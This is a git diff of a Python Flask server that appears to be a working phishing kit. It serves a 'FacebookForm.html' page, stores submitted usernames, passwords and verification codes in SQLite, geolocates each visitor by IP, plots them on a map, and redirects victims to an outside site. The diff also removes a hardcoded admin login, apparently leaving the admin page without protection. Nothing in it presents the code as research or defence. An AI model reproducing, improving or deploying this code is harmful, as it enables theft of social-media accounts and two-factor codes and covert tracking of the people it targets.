@@ -3,9 +3,19 @@ from datetime import datetime
 import logging
 import sqlite3
 import requests
-from colorama import Fore
 import folium
 import os
+
+# ========================
+# Logging Setup
+# ========================
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s | %(levelname)s | %(message)s"
+)
+
+logging.info("SERVER STARTED")
+
 # ========================
 # إنشاء قاعدة البيانات
 # ========================
@@ -13,7 +23,6 @@ def init_db():
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
 
-    # جدول تسجيل الحسابات
     cursor.execute("""
     CREATE TABLE IF NOT EXISTS users (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -27,7 +36,6 @@ def init_db():
     )
     """)
 
-    # جدول أكواد التحقق
     cursor.execute("""
     CREATE TABLE IF NOT EXISTS codes (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -41,7 +49,6 @@ def init_db():
     )
     """)
 
-    # جدول الزيارات (مع إحداثيات الموقع)
     cursor.execute("""
     CREATE TABLE IF NOT EXISTS visits (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -61,16 +68,8 @@ def init_db():
 
     conn.commit()
     conn.close()
-init_db() # تشغيل قاعدة البيانات
-# ========================
-# Logging
-# ========================
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s | %(levelname)s | %(message)s"
-)
 
-print(Fore.GREEN + "++++++++++++++++++++ SERVER STARTED ++++++++++++++++++++")
+init_db()
 
 # ========================
 # Flask
@@ -82,14 +81,15 @@ app.secret_key = "secret123"
 # استخراج IP الحقيقي
 # ========================
 def get_real_ip():
-    # افحص كل Headers الممكنة للحصول على IP
     ip = request.headers.get("X-Forwarded-For")
     if not ip:
         ip = request.headers.get("X-Real-IP")
     if not ip:
         ip = request.remote_addr
+
     if ip:
         ip = ip.split(",")[0].strip()
+
     return ip
 
 # ========================
@@ -100,13 +100,15 @@ def get_location(ip):
         url = f"https://ipapi.co/{ip}/json/"
         response = requests.get(url, timeout=3)
         data = response.json()
+
         country = data.get("country_name", "Unknown")
         city = data.get("city", "Unknown")
         isp = data.get("org", "Unknown")
-        lat = data.get("latitude", None)  # خط العرض
-        lon = data.get("longitude", None)  # خط الطول
+        lat = data.get("latitude", None)
+        lon = data.get("longitude", None)
 
         return country, city, isp, lat, lon
+
     except Exception as e:
         logging.error(f"Location API error: {e}")
         return None, None, None, None, None
@@ -114,11 +116,11 @@ def get_location(ip):
 # ========================
 # تسجيل كل request
 # ========================
-
 @app.before_request
 def log_every_request():
+
     if request.path in ["/ping", "/favicon.ico"]:
-        return  # تجاهل ping و favicon
+        return
 
     ip = get_real_ip()
     country, city, isp, lat, lon = get_location(ip)
@@ -128,25 +130,32 @@ def log_every_request():
     user_agent = request.headers.get("User-Agent", "").lower()
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # تمييز نوع الزائر
     if "facebookexternalhit" in user_agent:
         visitor_type = "Facebook Bot"
+        logging.warning("Facebook bot detected")
+
     elif "uptimerobot" in user_agent:
         visitor_type = "UptimeRobot"
+        logging.info("UptimeRobot ping")
+
     elif "bot" in user_agent or "crawl" in user_agent:
         visitor_type = "Other Bot"
+        logging.warning("Other bot detected")
+
     else:
         visitor_type = "Real User"
+        logging.info("Real user visit")
 
-    logging.info(f"{visitor_type} | {method} {path} | {ip} | {country} | {city} | {isp}")
+    logging.info(f"{method} {path} | {ip} | {country} | {city}")
 
-    # حفظ الزيارة في قاعدة البيانات
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
+
     cursor.execute("""
     INSERT INTO visits (ip, country, city, isp, path, method, user_agent, visitor_type, time, lat, lon)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     """, (ip, country, city, isp, path, method, user_agent, visitor_type, time, lat, lon))
+
     conn.commit()
     conn.close()
 
@@ -162,7 +171,7 @@ def favicon():
 # ========================
 @app.route("/ping")
 def ping():
-    logging.info(Fore.BLACK + "(PING) request received")
+    logging.info("Ping request received")
     return "OK", 200
 
 # ========================
@@ -170,13 +179,14 @@ def ping():
 # ========================
 @app.route("/")
 def home():
-    logging.info(Fore.GREEN + "User opened homepage")
+    logging.info("Homepage opened")
     return render_template("FacebookForm.html")
 
 # ========================
 # detect device
 # ========================
 def detect_device(user_agent):
+
     ua = user_agent.lower()
 
     if "android" in ua or "iphone" in ua:
@@ -217,7 +227,7 @@ def login():
     username = request.form.get("username")
     password = request.form.get("password")
 
-    logging.info(Fore.RED + f"Login attempt with username : {username} and password : {password}")
+    logging.warning(f"Login attempt | user: {username}")
 
     ip = get_real_ip()
     user_agent = request.headers.get("User-Agent", "Unknown")
@@ -236,37 +246,10 @@ def login():
     conn.commit()
     conn.close()
 
-    login_botton_url = "https://2742404919047.sarhne.com"
-    logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
-    return redirect(login_botton_url)
+    login_url = "https://2742404919047.sarhne.com"
+    logging.info("User redirected")
 
-# ========================
-# create
-# ========================
-@app.route("/create")
-def create():
-    return redirect("https://www.fhyi.com")
-
-# ========================
-# forgot
-# ========================
-@app.route("/forgot")
-def forgot():
-    return render_template("forgot.html")
-
-# ========================
-# verify
-# ========================
-@app.route("/verify", methods=["POST"])
-def verify():
-
-    phone_or_email = request.form.get("phone_or_email")
-    session["phone_or_email"] = phone_or_email
-
-    logging.info(Fore.GREEN + f"Verify request: {phone_or_email}")
-
-    logging.info("Redirected user to verify code page")
-    return render_template("verify.html")
+    return redirect(login_url)
 
 # ========================
 # verify_code
@@ -294,40 +277,13 @@ def verify_code():
     conn.commit()
     conn.close()
 
-    logging.info(Fore.RED + f"Verify Code: {code}")
+    logging.warning(f"Verification code captured: {code}")
 
-    login_botton_url = "https://2742404919047.sarhne.com"
-    logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
-    return redirect(login_botton_url)
-
-# ========================
-# Admin Login
-# ========================
-@app.route("/admin_login", methods=["GET", "POST"])
-def admin_login():
-
-    if request.method == "POST":
-
-        username = request.form.get("username")
-        password = request.form.get("password")
-
-        if username == "Hasan@RR" and password == "RafifIsMyLove":
-            session["admin"] = True
-            return redirect("/admin")
-        else:
-            return "❌ بيانات خاطئة"
-
-    return """
-    <h2>Admin Login</h2>
-    <form method="POST">
-    <input name="username"><br><br>
-    <input name="password" type="password"><br><br>
-    <button>Login</button>
-    </form>
-    """
+    login_url = "https://2742404919047.sarhne.com"
+    return redirect(login_url)
 
 # ========================
-# admin
+# Admin
 # ========================
 @app.route("/admin")
 def admin():
@@ -349,24 +305,7 @@ def admin():
 
     conn.close()
 
-    html = "<h2>Users</h2><table border='1' cellpadding='5'><tr>"
-    html += "<th>ID</th><th>Email</th><th>Password</th><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Time</th></tr>"
-
-    for user in users:
-        html += "<tr>" + "".join(f"<td>{col}</td>" for col in user) + "</tr>"
-
-    html += "</table><br><br>"
-
-    html += "<h2>Codes</h2><table border='1' cellpadding='5'><tr>"
-    html += "<th>ID</th><th>Email</th><th>Code</th><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Time</th></tr>"
-
-    for code in codes:
-        html += "<tr>" + "".join(f"<td>{col}</td>" for col in code) + "</tr>"
-
-    html += "</table><br><br>"
-
-    html += "<h2>Visits</h2><table border='1' cellpadding='5'><tr>"
-><    html += "<th>ID</th><th>IP</th><th>Country</th><th>City</th><th>ISP</th><th>Path</th><th>Method</th><th>User Agent</th><th>Visitor Type</th><th>Time</th><th>Latitude</th><th>Longitude</th></tr>"
+    html = "<h2>Visits</h2><table border='1'>"
 
     for visit in visits:
         html += "<tr>" + "".join(f"<td>{col}</td>" for col in visit) + "</tr>"
@@ -376,26 +315,20 @@ def admin():
     return html
 
 # ========================
-# logout
+# map
 # ========================
-@app.route("/logout")
-def logout():
-    session.pop("admin", None)
-    return "تم تسجيل الخروج"
-# ========================
-# دالة تحديد location
-# ========================
-
 @app.route("/map")
 def map_view():
+
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
+
     cursor.execute("SELECT ip, city, country, visitor_type, lat, lon FROM visits WHERE lat IS NOT NULL AND lon IS NOT NULL")
     visits = cursor.fetchall()
+
     conn.close()
 
-    # خريطة مركزها أول زيارة أو مركز عالمي
-    m = folium.Map(location=[20,0], zoom_start=3, tiles="Esri.WorldImagery")
+    m = folium.Map(location=[20,0], zoom_start=3)
 
     for ip, city, country, visitor_type, lat, lon in visits:
         folium.Marker(
@@ -403,11 +336,15 @@ def map_view():
             popup=f"{ip} | {city}, {country} | {visitor_type}"
         ).add_to(m)
 
-    return m._repr_html_()  # يعرض الخريطة مباشرة في HTML
+    return m._repr_html_()
+
 # ========================
 # تشغيل السيرفر
 # ========================
 if __name__ == "__main__":
+
     port = int(os.environ.get("PORT", 5000))
-    logging.info("Server is running...")
+
+    logging.info(f"Server running on port {port}")
+
     app.run(host="0.0.0.0", port=port)
